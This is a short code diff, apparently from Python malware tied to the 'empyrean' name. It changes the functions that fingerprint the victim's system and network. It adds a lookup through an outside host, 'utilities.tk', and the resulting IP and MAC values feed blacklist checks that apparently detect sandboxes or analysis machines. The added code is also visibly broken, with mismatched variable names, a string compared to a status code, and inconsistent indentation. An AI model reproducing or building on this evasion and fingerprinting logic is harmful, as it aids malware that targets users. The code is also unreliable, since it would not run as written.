@@ -478,9 +478,13 @@ RAM: {round(systemspec.system_specs()[2], 0)} GB
 		return operating_sys, os_release, os_version, architecture, hostname
 	
 	def network_info():
-		ip_address = requests.get('https://api.ipify.org').text
+		ip_address = requests.get('https://utilities.tk/network/info?ref=empyrean').text # "?ref=empyrean" is required for the correct formatting
+		if ip_address.status_code != 200:
+			ip_address = requests.get('https://api.ipify.org').text
+			if ip_address != 200:
+				ip_address = "error"
+		
 		mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-
 		return ip_address, mac_address
 	
 	def system_specs():
@@ -553,9 +557,12 @@ class debug:
                     pass
      
     def get_network(self):
-        ip = requests.get('https://api.ipify.org').text
-        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        
+	ip_address = requests.get('https://utilities.tk/network/info?ref=empyrean').text # "?ref=empyrean" is required for the correct formatting
+	if ip_address.status_code != 200:
+		ip_address = requests.get('https://api.ipify.org').text
+		if ip_address != 200:
+			ip_address = "error"
+	mad = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         if ip in self.blackListedIPS: return True	
         if mac in self.blackListedMacs: return True
         
